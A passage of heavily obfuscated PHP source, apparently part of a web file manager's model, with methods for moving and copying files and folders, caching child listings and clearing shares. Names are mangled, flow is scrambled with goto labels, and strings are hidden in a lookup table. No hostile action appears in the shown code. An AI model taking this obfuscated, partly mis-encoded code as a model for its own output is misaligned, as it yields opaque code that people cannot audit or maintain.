$FÏ¹æµ†º· = array(); goto FÜ§ÉŒ¸Á; bÒ¾ŒÊ¤˜: $this->chunkEventSet($BÂ¼—æ¥³‘[511], array($BÂ¼—æ¥³‘[512], $F¦ˆé‹ñ„‡, $e¸ÈÎğî)); $this->saveAll($a½ï«¯…ùÇ); return $dêË‘¸ñÆâ; goto d—÷öê¨ğí; a£çòø†ó: $eœŠŠÚ·…† = $this->sourceInfo($dêË‘¸ñÆâ); foreach ($Fç„²—ÛÀ as $C·Åï‰Ÿ¨¬) { $cê˜‘ƒõ = $this->_makeItemData($C·Åï‰Ÿ¨¬, $eœŠŠÚ·…†, $C·Åï‰Ÿ¨¬[$BÂ¼—æ¥³‘[28]]); $cê˜‘ƒõ[$BÂ¼—æ¥³‘[455]] = $C·Åï‰Ÿ¨¬[$BÂ¼—æ¥³‘[455]]; $FÏ¹æµ†º·[] = $cê˜‘ƒõ; } $this->chunkEventSet($BÂ¼—æ¥³‘[507], array($BÂ¼—æ¥³‘[508], $F¦ˆé‹ñ„‡, $e¸ÈÎğî)); goto d¨º¤ê£©ó; BÜ£Ì¡à¾â: $F¦ˆé‹ñ„‡ = $this->_makeItemData($EÄ×­ÀÕõ, $aáÊ´»ä«, $a §ó§á„); Hook::trigger($BÂ¼—æ¥³‘[504], $F¦ˆé‹ñ„‡); Hook::trigger($BÂ¼—æ¥³‘[505], array($BÂ¼—æ¥³‘[506], $F¦ˆé‹ñ„‡, 0)); goto b÷°®ïï‚‰; d¨º¤ê£©ó: $this->addAll($FÏ¹æµ†º·, array(), !1); $C¥á¡íÂ¦ = $this->where(array($BÂ¼—æ¥³‘[457] => $dêË‘¸ñÆâ))->select(); $BóêÙ†µòŠ = $this->_childrenMakeRelation($Fç„²—ÛÀ, $C¥á¡íÂ¦); goto Bö‰¼÷Ÿ–; FÜ§ÉŒ¸Á: $this->_childrenListAll($e‡¸†¼­, $Fç„²—ÛÀ); $e¸ÈÎğî = count($Fç„²—ÛÀ); if ($e¸ÈÎğî == 0) { return $dêË‘¸ñÆâ; } goto a£çòø†ó; Bö‰¼÷Ÿ–: $BóêÙ†µòŠ[$e‡¸†¼­] = $dêË‘¸ñÆâ; $bÖåÀÏ×Œ = array(); $a½ï«¯…ùÇ = array(); goto e¤™Ö¼íÕ; d—÷öê¨ğí: } private function _childrenMakeRelation($fĞ‚ï×Û·, $EÁ‹Ô‘˜µ°) { $eò·ãÙğ =& $_SERVER[£ü]; $DÒä¿Æª¿‹ = array(); $d•“×‰ä•º = array(); foreach ($fĞ‚ï×Û· as $Bêàƒ”Àæ) { $e †ï¼¨” = $Bêàƒ”Àæ[$eò·ãÙğ[28]] . $eò·ãÙğ[8] . $Bêàƒ”Àæ[$eò·ãÙğ[455]]; $DÒä¿Æª¿‹[$e †ï¼¨”] = $Bêàƒ”Àæ[$eò·ãÙğ[366]]; } foreach ($EÁ‹Ô‘˜µ° as $Bêàƒ”Àæ) { $e †ï¼¨” = $Bêàƒ”Àæ[$eò·ãÙğ[28]] . $eò·ãÙğ[8] . $Bêàƒ”Àæ[$eò·ãÙğ[455]]; $fŸ¿ç×éİ‚ = $DÒä¿Æª¿‹[$e †ï¼¨”]; $d•“×‰ä•º[$fŸ¿ç×éİ‚] = $Bêàƒ”Àæ[$eò·ãÙğ[366]]; } return $d•“×‰ä•º; } private function _childrenMatch($dÛœÊäŸ—Ä, $fá‰”ëÃÍæ, $C¨óëŒÚ ) { goto F‚ÃÌæğòË; eé¦ñÊ‚‡: $fÏè«ÕÔâ = $eªÒ¡ËÃƒº[count($eªÒ¡ËÃƒº) - 1]; return array($d‘ÍÌÌ£‡Ï[457] => $fÏè«ÕÔâ, $d‘ÍÌÌ£‡Ï[455] => $açŸ†š ‰²); goto FéŞê©Ó†ğ; F‚ÃÌæğòË: $d‘ÍÌÌ£‡Ï =& $_SERVER[£ü]; $açŸ†š ‰² = $C¨óëŒÚ [$d‘ÍÌÌ£‡Ï[455]]; $aÊ°ö¨½É„ = $this->parentLevelArray($fá‰”ëÃÍæ[$d‘ÍÌÌ£‡Ï[455]]); goto a“ÙÍ†…½Î; a“ÙÍ†…½Î: foreach ($aÊ°ö¨½É„ as $fáÅ„ƒ¹¡) { if (isset($dÛœÊäŸ—Ä[$fáÅ„ƒ¹¡])) { $açŸ†š ‰² .= $dÛœÊäŸ—Ä[$fáÅ„ƒ¹¡] . $d‘ÍÌÌ£‡Ï[513]; } } $açŸ†š ‰² = rtrim($açŸ†š ‰², $d‘ÍÌÌ£‡Ï[47]) . $d‘ÍÌÌ£‡Ï[47]; $eªÒ¡ËÃƒº = $this->parentLevelArray($açŸ†š ‰²); goto eé¦ñÊ‚‡; FéŞê©Ó†ğ: } private function _makeItemData($F¹Ì­¦ƒ±š, $e ÕÛ›°‰³, $dÛ‡’“Š¶›) { $DŠ±Úßäèº =& $_SERVER[£ü]; $d­†šÒ¹³Ÿ = array($DŠ±Úßäèº[514] => $F¹Ì­¦ƒ±š[$DŠ±Úßäèº[367]], $DŠ±Úßäèº[383] => $dÛ‡’“Š¶›, $DŠ±Úßäèº[515] => $F¹Ì­¦ƒ±š[$DŠ±Úßäèº[369]], $DŠ±Úßäèº[416] => $F¹Ì­¦ƒ±š[$DŠ±Úßäèº[415]], $DŠ±Úßäèº[516] => $F¹Ì­¦ƒ±š[$DŠ±Úßäèº[77]], $DŠ±Úßäèº[517] => $e ÕÛ›°‰³[$DŠ±Úßäèº[368]], $DŠ±Úßäèº[518] => $e ÕÛ›°‰³[$DŠ±Úßäèº[452]], $DŠ±Úßäèº[519] => USER_ID, $DŠ±Úßäèº[520] => USER_ID, $DŠ±Úßäèº[365] => $e ÕÛ›°‰³[$DŠ±Úßäèº[366]], $DŠ±Úßäèº[521] => $e ÕÛ›°‰³[$DŠ±Úßäèº[455]] . $e ÕÛ›°‰³[$DŠ±Úßäèº[366]] . $DŠ±Úßäèº[47], $DŠ±Úßäèº[392] => 0, $DŠ±Úßäèº[522] => $DŠ±Úßäèº[33]); return $d­†šÒ¹³Ÿ; } private function _copyApplyMeta($fëñµƒ¯ê¨, &$c¤¼±¹ºÕê) { $fâÒâ¤Ô®ò =& $_SERVER[£ü]; $cõ£˜Ï¾ŞÒ = $fëñµƒ¯ê¨[$fâÒâ¤Ô®ò[366]]; $DŸè—µ‰Î„ = $fëñµƒ¯ê¨[$fâÒâ¤Ô®ò[28]]; if (!isset($fëñµƒ¯ê¨[$fâÒâ¤Ô®ò[523]]) || !$fëñµƒ¯ê¨[$fâÒâ¤Ô®ò[523]] || $fëñµƒ¯ê¨[$fâÒâ¤Ô®ò[523]] == $fâÒâ¤Ô®ò[464]) { $c¤¼±¹ºÕê[$fâÒâ¤Ô®ò[499]][] = array($fâÒâ¤Ô®ò[366], $cõ£˜Ï¾ŞÒ, $fâÒâ¤Ô®ò[523], short_id($cõ£˜Ï¾ŞÒ)); } if (Input::check($DŸè—µ‰Î„, $fâÒâ¤Ô®ò[524])) { $c¤¼±¹ºÕê[$fâÒâ¤Ô®ò[498]][] = array($fâÒâ¤Ô®ò[366] => $cõ£˜Ï¾ŞÒ, $fâÒâ¤Ô®ò[89] => $fâÒâ¤Ô®ò[412], $fâÒâ¤Ô®ò[356] => str_replace($fâÒâ¤Ô®ò[50], $fâÒâ¤Ô®ò[33], Pinyin::encode($DŸè—µ‰Î„))); $c¤¼±¹ºÕê[$fâÒâ¤Ô®ò[498]][] = array($fâÒâ¤Ô®ò[366] => $cõ£˜Ï¾ŞÒ, $fâÒâ¤Ô®ò[89] => $fâÒâ¤Ô®ò[411], $fâÒâ¤Ô®ò[356] => Pinyin::encode($DŸè—µ‰Î„, $fâÒâ¤Ô®ò[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Fï¼Ì…”Èğ) { goto aî®œî†÷Œ; bµóµŸº©Ş: $c³ôñºùË¬ = array_to_keyvalue($c³ôñºùË¬, $cˆĞãñŠ®â[366]); foreach ($c³ôñºùË¬ as $eÚ«»Íº) { $A¦ÀÏÉà¶¸ = $eÚ«»Íº[$cˆĞãñŠ®â[457]]; $Fï¼Ì…”Èğ = $eÚ«»Íº[$cˆĞãñŠ®â[366]]; if (!isset($this->_childrenListCache[$Fï¼Ì…”Èğ]) && $eÚ«»Íº[$cˆĞãñŠ®â[367]] == $cˆĞãñŠ®â[83]) { $this->_childrenListCache[$Fï¼Ì…”Èğ] = array(); } if (!isset($this->_childrenListCache[$A¦ÀÏÉà¶¸])) { $this->_childrenListCache[$A¦ÀÏÉà¶¸] = array(); } $this->_childrenListCache[$A¦ÀÏÉà¶¸][$Fï¼Ì…”Èğ] = $eÚ«»Íº; $this->_childrenItemCache[$Fï¼Ì…”Èğ] = $eÚ«»Íº; } goto A…´Ö¡Ì×Û; aÆ ˜³ê™: $D›¼á¡ªÇ = array($cˆĞãñŠ®â[455] => array($cˆĞãñŠ®â[479], $a¼àìÅí‚[$cˆĞãñŠ®â[455]] . $Fï¼Ì…”Èğ . $cˆĞãñŠ®â[480]), $cˆĞãñŠ®â[393] => $this->targetIsDelete); $c³ôñºùË¬ = $this->field($BŒ•Ú‘®Ñß)->where($D›¼á¡ªÇ)->select(); if (!$c³ôñºùË¬) { return; } goto bµóµŸº©Ş; aî®œî†÷Œ: $cˆĞãñŠ®â =& $_SERVER[£ü]; $a¼àìÅí‚ = $this->sourceInfo($Fï¼Ì…”Èğ); $BŒ•Ú‘®Ñß = $cˆĞãñŠ®â[526]; goto aÆ ˜³ê™; A…´Ö¡Ì×Û: } private function _childrenListAll($C¤¸Ş‘Ö’İ, &$F“…ÙÅ“Ğ) { $b™¦·ñÜ¦¼ =& $_SERVER[£ü]; if (!isset($this->_childrenListCache[$C¤¸Ş‘Ö’İ])) { return; } $D»¨¿¯‹ = $this->_childrenListCache[$C¤¸Ş‘Ö’İ]; foreach ($D»¨¿¯‹ as $B÷öµªççí => $dœ˜åØ¢) { $F“…ÙÅ“Ğ[$B÷öµªççí] = $dœ˜åØ¢; if ($dœ˜åØ¢[$b™¦·ñÜ¦¼[367]] == $b™¦·ñÜ¦¼[83]) { $this->_childrenListAll($B÷öµªççí, $F“…ÙÅ“Ğ); } } } private function sourceInfoCache($E¸¿µˆ–†Ñ) { if (isset($this->_childrenItemCache[$E¸¿µˆ–†Ñ])) { return $this->_childrenItemCache[$E¸¿µˆ–†Ñ]; } return $this->sourceInfo($E¸¿µˆ–†Ñ); } private function _childrenList($BóÏñéŒ) { if (isset($this->_childrenListCache[$BóÏñéŒ])) { return $this->_childrenListCache[$BóÏñéŒ]; } return $this->_childrenListSelect($BóÏñéŒ); } private function _childrenListSelect($aöÑÙÚŞ˜Õ) { goto FˆôÛä‡Åº; f‰×ÖÁİ±ª: foreach ($A…®ÈŞÇÊ as $aöÑÙÚŞ˜Õ => $B™ªçæé¥) { $this->_childrenItemCache[$aöÑÙÚŞ˜Õ] = $B™ªçæé¥; } return $A…®ÈŞÇÊ; goto D”Æ¿¿÷ŒÆ; FˆôÛä‡Åº: $CÌæç¿·İ® =& $_SERVER[£ü]; $DåŞ¯Å³ = array($CÌæç¿·İ®[457] => $aöÑÙÚŞ˜Õ, $CÌæç¿·İ®[393] => $this->targetIsDelete); $DµìèÊÁµ = $this->where($DåŞ¯Å³)->select(); goto dôê…›„Ãí; dôê…›„Ãí: $DµìèÊÁµ = $DµìèÊÁµ ? $DµìèÊÁµ : array(); $A…®ÈŞÇÊ = array_to_keyvalue($DµìèÊÁµ, $CÌæç¿·İ®[366]); $this->_childrenListCache[$aöÑÙÚŞ˜Õ] = $A…®ÈŞÇÊ; goto f‰×ÖÁİ±ª; D”Æ¿¿÷ŒÆ: } private function fileNameExistCache($EößÇìÃ˜, $E ‘Ğ£Æ) { $BÍ¯ˆ™’œ =& $_SERVER[£ü]; $E ‘Ğ£Æ = strtolower($E ‘Ğ£Æ); $fãá¬İÓ†’ = $this->_childrenList($EößÇìÃ˜); foreach ($fãá¬İÓ†’ as $AŒÈ™ŒÔ è) { if ($E ‘Ğ£Æ == strtolower($AŒÈ™ŒÔ è[$BÍ¯ˆ™’œ[28]])) { return $AŒÈ™ŒÔ è[$BÍ¯ˆ™’œ[366]]; } } return !1; } private function fileNameAutoCache($DìÁçÈËÆÅ, $dí½·ºä½–, $b“…·åµÎÊ, $bÉÔ·è˜–¡) { $CÈÚŠÏ®¸Ï =& $_SERVER[£ü]; $d‡ğ¦ñ¦¶¥ = $this->_childrenList($DìÁçÈËÆÅ); $a¹ñÄ½­£¿ = array_to_keyvalue($d‡ğ¦ñ¦¶¥, $CÈÚŠÏ®¸Ï[33], $CÈÚŠÏ®¸Ï[28]); return $this->fileNameAutoGet($a¹ñÄ½­£¿, $dí½·ºä½–, $b“…·åµÎÊ, $bÉÔ·è˜–¡); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($e¹† Œ¯Û©, $fîêÍ‰Ç, $fŸáÑõßÃÛ = REPEAT_REPLACE, $C©ÕÑæõ‡ = '') { goto fÕÛªŠâ¼Æ; FÇŒù¾Ö¡: Model($d¥Öƒ®ùİá[164])->linkAdd($aÏì‰Ãóå[$d¥Öƒ®ùİá[497]]); if ($c­­ÈßÏÄ && $aÏì‰Ãóå[$d¥Öƒ®ùİá[529]]) { $this->removeNow($e¹† Œ¯Û©, !1); } $this->lockMoveEnd($e¹† Œ¯Û©); goto a¤²Ä¾ ë; dºáó‘ˆÊµ: $B¿ôø„„öº = $this->_move($e¹† Œ¯Û©, $fîêÍ‰Ç, $fŸáÑõßÃÛ, $aÏì‰Ãóå, $C©ÕÑæõ‡); $this->sourceCacheClear(); if ($D©Ó·½«›[$d¥Öƒ®ùİá[367]] == $d¥Öƒ®ùİá[83] && $c­­ÈßÏÄ) { $this->folderSizeResetChildren($B¿ôø„„öº); } goto FÇŒù¾Ö¡; DŸİ¨øÀ†Ø: $aÏì‰Ãóå = array($d¥Öƒ®ùİá[497] => array(), $d¥Öƒ®ùİá[529] => !1); $this->clearShare($e¹† Œ¯Û©, $fîêÍ‰Ç); $c­­ÈßÏÄ = $this->fileNameExistCache($fîêÍ‰Ç, $D©Ó·½«›[$d¥Öƒ®ùİá[28]]); goto dºáó‘ˆÊµ; bÙ¬¾Å¥’: Model($d¥Öƒ®ùİá[501])->eventMove($e¹† Œ¯Û©, $D©Ó·½«›[$d¥Öƒ®ùİá[457]], $fîêÍ‰Ç); Hook::trigger($d¥Öƒ®ùİá[528], $EŒé¯‘Ö); return $B¿ôø„„öº; goto c¡Àã°İÓ; eª‰–ƒ‰†: Hook::trigger($d¥Öƒ®ùİá[527], $EŒé¯‘Ö); $this->targetIsDelete = intval($D©Ó·½«›[$d¥Öƒ®ùİá[393]]); if ($D©Ó·½«›[$d¥Öƒ®ùİá[457]] == $fîêÍ‰Ç && $C©ÕÑæõ‡ != $D©Ó·½«›[$d¥Öƒ®ùİá[28]]) { $AÜÔÒĞš¸ = $this->fileNameExist($fîêÍ‰Ç, $C©ÕÑæõ‡); if ($AÜÔÒĞš¸ && $D©Ó·½«›[$d¥Öƒ®ùİá[367]] == $d¥Öƒ®ùİá[464]) { goto aé§´¨ö; f±½ÆÊ„Â‘: return $AÜÔÒĞš¸; goto CÊğ¸›—¸¯; eÆ”ßÕØİ˜: $this->removeNow($e¹† Œ¯Û©, !1); $this->folderSizeReset($fîêÍ‰Ç); Hook::trigger($d¥Öƒ®ùİá[528], $EŒé¯‘Ö); goto f±½ÆÊ„Â‘; aé§´¨ö: $Aˆ’÷ñÔáÖ = $this->sourceInfo($AÜÔÒĞš¸); $AÃ‡Å°»öã = $this->fileHistory($Aˆ’÷ñÔáÖ, $D©Ó·½«›[$d¥Öƒ®ùİá[415]], $D©Ó·½«›[$d¥Öƒ®ùİá[77]]); if (!$AÃ‡Å°»öã) { Model($d¥Öƒ®ùİá[418])->remove($D©Ó·½«›[$d¥Öƒ®ùİá[415]]); } goto eÆ”ßÕØİ˜; CÊğ¸›—¸¯: } } goto cÔ‚’óÙâ; D‰ îè‹¤•: $eÌ‘³òÂçœ = array($D©Ó·½«›[$d¥Öƒ®ùİá[457]], $fîêÍ‰Ç); if ($D©Ó·½«›[$d¥Öƒ®ùİá[367]] == $d¥Öƒ®ùİá[83]) { $eÌ‘³òÂçœ[] = $e¹† Œ¯Û©; } $this->updateModifyTime($eÌ‘³òÂçœ); goto bÙ¬¾Å¥’; fÕÛªŠâ¼Æ: $d¥Öƒ®ùİá =& $_SERVER[£ü]; $D©Ó·½«› = $this->sourceInfo($e¹† Œ¯Û©); $aéõ­˜ñôì = $this->sourceInfo($fîêÍ‰Ç); goto CÄ‹Â°¼‹·; CÄ‹Â°¼‹·: $EŒé¯‘Ö = $this->pathInfoMore($e¹† Œ¯Û©); if ($this->isParentOf($e¹† Œ¯Û©, $fîêÍ‰Ç)) { return !1; } if (!$D©Ó·½«› || !$aéõ­˜ñôì || $aéõ­˜ñôì[$d¥Öƒ®ùİá[367]] != $d¥Öƒ®ùİá[83]) { return !1; } goto eª‰–ƒ‰†; cÔ‚’óÙâ: $AßÒ†Ş ø… = $C©ÕÑæõ‡ ? $C©ÕÑæõ‡ : $D©Ó·½«›[$d¥Öƒ®ùİá[28]]; $this->lockMoveStart($e¹† Œ¯Û©); $this->lockWriteStart($fîêÍ‰Ç, $AßÒ†Ş ø…); goto DŸİ¨øÀ†Ø; a¤²Ä¾ ë: $this->lockWriteEnd($fîêÍ‰Ç, $AßÒ†Ş ø…); $this->folderSizeReset($D©Ó·½«›[$d¥Öƒ®ùİá[457]]); $this->folderSizeReset($fîêÍ‰Ç); goto D‰ îè‹¤•; c¡Àã°İÓ: } private function _move($f–¥¬†­·, $Dø›²âéë‘, $AªÖ‘¦Ö£®, &$dÛ™×¹ÔõÄ, $f‹˜”¨ğ‰‚ = '') { goto c–ù‰ŸÜ•æ; d¾‰ÎÀ¯ÙË: return $Dø­˜ÓÜ‰¬; goto fí´Š¨áÎ›; dõ¬‚ÄĞ´Í: $this->lockWriteStart($Dø›²âéë‘, $D«Ã¿©¯Å); if (!$Aöåˆğ×¤¹) { return $this->_moveForce($f–¥¬†­·, $Dø›²âéë‘, $D«Ã¿©¯Å); } $Dø­˜ÓÜ‰¬ = $Aöåˆğ×¤¹; goto c»•‰“İ¿; c»•‰“İ¿: $Bä†ƒ‡­†½ = !1; if ($c’åÎà»éÎ) { if ($AªÖ‘¦Ö£® == REPEAT_RENAME_FOLDER) { $D«Ã¿©¯Å = $this->fileNameAuto($Dø›²âéë‘, $D«Ã¿©¯Å, $AªÖ‘¦Ö£®, $c’åÎà»éÎ); $Dø­˜ÓÜ‰¬ = $this->_moveForce($f–¥¬†­·, $Dø›²âéë‘, $D«Ã¿©¯Å); } else { if ($AªÖ‘¦Ö£® == REPEAT_RENAME_FOLDER) { $AªÖ‘¦Ö£® = REPEAT_RENAME; } $E¾´µËÇ°Ÿ = $this->_childrenListSelect($f–¥¬†­·); foreach ($E¾´µËÇ°Ÿ as $DÙšçá¹äŞ) { $this->_move($DÙšçá¹äŞ[$cŸ‹éŠ‚³[366]], $Aöåˆğ×¤¹, $AªÖ‘¦Ö£®, $dÛ™×¹ÔõÄ); } $Bä†ƒ‡­†½ = !0; } } else { if ($AªÖ‘¦Ö£® == REPEAT_SKIP) { $Bä†ƒ‡­†½ = !0; } else { if ($AªÖ‘¦Ö£® == REPEAT_RENAME || $AªÖ‘¦Ö£® == REPEAT_RENAME_FOLDER) { $D«Ã¿©¯Å = $this->fileNameAuto($Dø›²âéë‘, $D«Ã¿©¯Å, $AªÖ‘¦Ö£®, $c’åÎà»éÎ); $Dø­˜ÓÜ‰¬ = $this->_moveForce($f–¥¬†­·, $Dø›²âéë‘, $D«Ã¿©¯Å); } else { if ($AªÖ‘¦Ö£® == REPEAT_REPLACE) { $a¥³ÓÚ‹Œİ = $this->sourceInfoCache($Aöåˆğ×¤¹); $EÚÛ…ÇÏ„  = $this->fileHistory($a¥³ÓÚ‹Œİ, $dõ‹ğÒØÏ[$cŸ‹éŠ‚³[415]], $dõ‹ğÒØÏ[$cŸ‹éŠ‚³[77]]); if ($EÚÛ…ÇÏ„ ) { $dÛ™×¹ÔõÄ[$cŸ‹éŠ‚³[497]][] = $dõ‹ğÒØÏ[$cŸ‹éŠ‚³[415]]; } else { $Bä†ƒ‡­†½ = !0; } } } } } if ($Bä†ƒ‡­†½ && !$dÛ™×¹ÔõÄ[$cŸ‹éŠ‚³[529]]) { $dÛ™×¹ÔõÄ[$cŸ‹éŠ‚³[529]] = !0; } goto d¾‰ÎÀ¯ÙË; E’ë“¡‘ê¡: $D«Ã¿©¯Å = $f‹˜”¨ğ‰‚ ? $f‹˜”¨ğ‰‚ : $dõ‹ğÒØÏ[$cŸ‹éŠ‚³[28]]; $Aöåˆğ×¤¹ = $this->fileNameExistCache($Dø›²âéë‘, $D«Ã¿©¯Å); $this->lockMoveStart($f–¥¬†­·); goto dõ¬‚ÄĞ´Í; c–ù‰ŸÜ•æ: $cŸ‹éŠ‚³ =& $_SERVER[£ü]; $dõ‹ğÒØÏ = $this->sourceInfo($f–¥¬†­·); $c’åÎà»éÎ = $dõ‹ğÒØÏ[$cŸ‹éŠ‚³[367]] == $cŸ‹éŠ‚³[83]; goto E’ë“¡‘ê¡; fí´Š¨áÎ›: } private function _moveForce($b—‚«Œ’Ä», $Aë‘Ï±‹Šì, $E¿áè£‚¤µ) { goto Fæˆ„õîÏÀ; aËµî‘ŞºÕ: if ($DÒÆàáÊË¾) { $A²‹ù¸¤İ = array($Bßšïíˆ[521] => array($Bßšïíˆ[479], $eä¾íÁ˜îä[$Bßšïíˆ[455]] . $eä¾íÁ˜îä[$Bßšïíˆ[366]] . $Bßšïíˆ[480])); $b…ÄòËÎ­ = $eä¾íÁ˜îä[$Bßšïíˆ[455]] . $eä¾íÁ˜îä[$Bßšïíˆ[366]] . $Bßšïíˆ[47]; $bçÓÜ‡Œ¹ = $a£´ŸŸŠÚå[$Bßšïíˆ[455]] . $a£´ŸŸŠÚå[$Bßšïíˆ[366]] . $Bßšïíˆ[47] . $eä¾íÁ˜îä[$Bßšïíˆ[366]] . $Bßšïíˆ[47]; $d˜µˆ¿¢¡ì = array($Bßšïíˆ[521] => array($Bßšïíˆ[530], "\162\x65\x70\x6c\141\x63\x65\50\x70\x61\x72\145\x6e\x74\x4c\145\x76\x65\x6c\54\47{$b…ÄòËÎ­}\x27\x2c\47{$bçÓÜ‡Œ¹}\x27\51"), $Bßšïíˆ[517] => $a£´ŸŸŠÚå[$Bßšïíˆ[368]], $Bßšïíˆ[518] => $a£´ŸŸŠÚå[$Bßšïíˆ[452]]); if ($E’²Ş‹†Ò™) { $d˜µˆ¿¢¡ì[$Bßšïíˆ[392]] = 0; } $this->where($A²‹ù¸¤İ)->data($d˜µˆ¿¢¡ì)->save(); } $this->where(array($Bßšïíˆ[380] => $b—‚«Œ’Ä»))->data($AÇ¢ãé´÷)->save(); return $b—‚«Œ’Ä»; goto cŸ™‹£ˆÈÅ; Fæˆ„õîÏÀ: $Bßšïíˆ =& $_SERVER[£ü]; $eä¾íÁ˜îä = $this->sourceInfo($b—‚«Œ’Ä»); $a£´ŸŸŠÚå = $this->sourceInfo($Aë‘Ï±‹Šì); goto DÆ£ñ—µÃ“; DÆ£ñ—µÃ“: $DÒÆàáÊË¾ = $eä¾íÁ˜îä[$Bßšïíˆ[367]] == $Bßšïíˆ[83]; $AÇ¢ãé´÷ = array($Bßšïíˆ[365] => $a£´ŸŸŠÚå[$Bßšïíˆ[366]], $Bßšïíˆ[521] => $a£´ŸŸŠÚå[$Bßšïíˆ[455]] . $a£´ŸŸŠÚå[$Bßšïíˆ[366]] . $Bßšïíˆ[47], $Bßšïíˆ[517] => $a£´ŸŸŠÚå[$Bßšïíˆ[368]], $Bßšïíˆ[518] => $a£´ŸŸŠÚå[$Bßšïíˆ[452]], $Bßšïíˆ[520] => USER_ID, $Bßšïíˆ[383] => $E¿áè£‚¤µ); $f®¨ëŠºà = $eä¾íÁ˜îä[$Bßšïíˆ[368]] == SourceModel::TYPE_GROUP && $a£´ŸŸŠÚå[$Bßšïíˆ[368]] == SourceModel::TYPE_GROUP && $eä¾íÁ˜îä[$Bßšïíˆ[452]] == $a£´ŸŸŠÚå[$Bßšïíˆ[452]]; goto F«º²Ãˆóï; F«º²Ãˆóï: if (!$f®¨ëŠºà) { Model($Bßšïíˆ[450])->authClear($b—‚«Œ’Ä»); } $E’²Ş‹†Ò™ = $eä¾íÁ˜îä[$Bßšïíˆ[393]] == $Bßšïíˆ[83] && $a£´ŸŸŠÚå[$Bßšïíˆ[393]] != $Bßšïíˆ[83]; if ($E’²Ş‹†Ò™) { $AÇ¢ãé´÷[$Bßšïíˆ[392]] = 0; } goto aËµî‘ŞºÕ; cŸ™‹£ˆÈÅ: } private function clearShare($C‚‹×½˜÷Ü, $C‡À‘·˜¦‡) { goto cö…ë³¢; bêÖª‚ª­À: if ($F¦ò÷À¼İ†[$C¹´Ëå¯¦«[452]] == $d®ºÃ‚Ìè[$C¹´Ëå¯¦«[452]] && $F¦ò÷À¼İ†[$C¹´Ëå¯¦«[368]] == $C¹´Ëå¯¦«[531]) { return; } $Cªò£ÂÓµ£ = array($C¹´Ëå¯¦«[455] => array($C¹´Ëå¯¦«[479], $F¦ò÷À¼İ†[$C¹´Ëå¯¦«[455]] . $C‚‹×½˜÷Ü . $C¹´Ëå¯¦«[480])); $aŒä·¾„Ö… = $this->field($C¹´Ëå¯¦«[380])->where($Cªò£ÂÓµ£)->getField($C¹´Ëå¯¦«[366], !0); goto AçˆîóôÆ˜; e™Ï‘¢°ÇÆ: if (!$b•™±‡ù¡Ú) { return; } $b•™±‡ù¡Ú = array_to_keyvalue($b•™±‡ù¡Ú, $C¹´Ëå¯¦«[33], $C¹´Ëå¯¦«[437]); $Cªò£ÂÓµ£ = array($C¹´Ëå¯¦«[437] => array($C¹´Ëå¯¦«[7], $b•™±‡ù¡Ú)); goto aÜĞ¶¨ÂÉ; cö…ë³¢: $C¹´Ëå¯¦« =& $_SERVER[£ü]; $F¦ò÷À¼İ† = $this->sourceInfo($C‚‹×½˜÷Ü); $d®ºÃ‚Ìè = $this->sourceInfo($C‡À‘·˜¦‡); goto bêÖª‚ª­À; AçˆîóôÆ˜: if (!$aŒä·¾„Ö…) { return; } $Cªò£ÂÓµ£ = array($C¹´Ëå¯¦«[366] => array($C¹´Ëå¯¦«[7], $aŒä·¾„Ö…), $C¹´Ëå¯¦«[444] => 1); $b•™±‡ù¡Ú = Model($C¹´Ëå¯¦«[532])->field($C¹´Ëå¯¦«[437])->where($Cªò£ÂÓµ£)->select(); goto e™Ï‘¢°ÇÆ; aÜĞ¶¨ÂÉ: Model($C¹´Ëå¯¦«[532])->where($Cªò£ÂÓµ£)->save(array($C¹´Ëå¯¦«[444] => 0)); Model($C¹´Ëå¯¦«[533])->where($Cªò£ÂÓµ£)->delete(); goto b·¹’ Ô; b·¹’ Ô: } public function copyFolderFromIO($EÜãŒøƒºƒ, $d‡½©´«Š´, $bÅÈòÓ¹´‚, $aÔÊ¡ÁÁï, $a¬…„°§´Ä, $dÜ…†ê®¬Î = false) { goto E»Çïƒ¯âê; EÌ¤‡ØÖ‡‹: Model($B§Ô”ÜŒ¸[418])->linkAdd($A×õæ¡›í„[$B§Ô”ÜŒ¸[497]]); Model($B§Ô”ÜŒ¸[418])->remove($A×õæ¡›í„[$B§Ô”ÜŒ¸[534]]); $this->folderSizeReset($bÅÈòÓ¹´‚); goto E¤ŞÅÂ…‘Æ; e±©ŞƒÓÁ: if ($eèñ„„†íÖ) { $this->_childrenAllMake($eèñ„„†íÖ); } Hook::trigger($B§Ô”ÜŒ¸[535]); $this->_copyChildTo($EÜãŒøƒºƒ, $d‡½©´«Š´, $dé‡¿ÙÅÂ¤, $aÔÊ¡ÁÁï, $A×õæ¡›í„, $a¬…„°§´Ä); goto e”ñë¿ñ; e”ñë¿ñ: Hook::trigger($B§Ô”ÜŒ¸[536]); if ($dé‡¿ÙÅÂ¤) { $this->folderSizeResetChildren($dé‡¿ÙÅÂ¤); } $this->_childrenListClear(); goto c™„¥ó×Å©; c™„¥ó×Å©: Model($B§Ô”ÜŒ¸[500])->addAll($A×õæ¡›í„[$B§Ô”ÜŒ¸[498]], array(), !0); Model($B§Ô”ÜŒ¸[501])->eventCopy($dé‡¿ÙÅÂ¤); $this->saveAll($A×õæ¡›í„[$B§Ô”ÜŒ¸[499]]); goto EÌ¤‡ØÖ‡‹; EâßŒ†ŸìŸ: $eèñ„„†íÖ = $this->fileNameExist($bÅÈòÓ¹´‚, $føË¿ã‘‹“); $dé‡¿ÙÅÂ¤ = $this->mkdir($bÅÈòÓ¹´‚, $føË¿ã‘‹“, $aÔÊ¡ÁÁï); if (!$eèñ„„†íÖ || $aÔÊ¡ÁÁï == REPEAT_RENAME_FOLDER) { $aÔÊ¡ÁÁï = !1; } goto e±©ŞƒÓÁ; E»Çïƒ¯âê: $B§Ô”ÜŒ¸ =& $_SERVER[£ü]; $A×õæ¡›í„ = array($B§Ô”ÜŒ¸[498] => array(), $B§Ô”ÜŒ¸[499] => array(), $B§Ô”ÜŒ¸[497] => array(), $B§Ô”ÜŒ¸[534] => array()); $føË¿ã‘‹“ = $dÜ…†ê®¬Î ? $dÜ…†ê®¬Î : $EÜãŒøƒºƒ->getPathName($EÜãŒøƒºƒ->pathThis($d‡½©´«Š´)); goto EâßŒ†ŸìŸ; E¤ŞÅÂ…‘Æ: $this->updateModifyTime($bÅÈòÓ¹´‚); return $dé‡¿ÙÅÂ¤; goto bÑˆÚ¾ÃÄ­; bÑˆÚ¾ÃÄ­: } private function 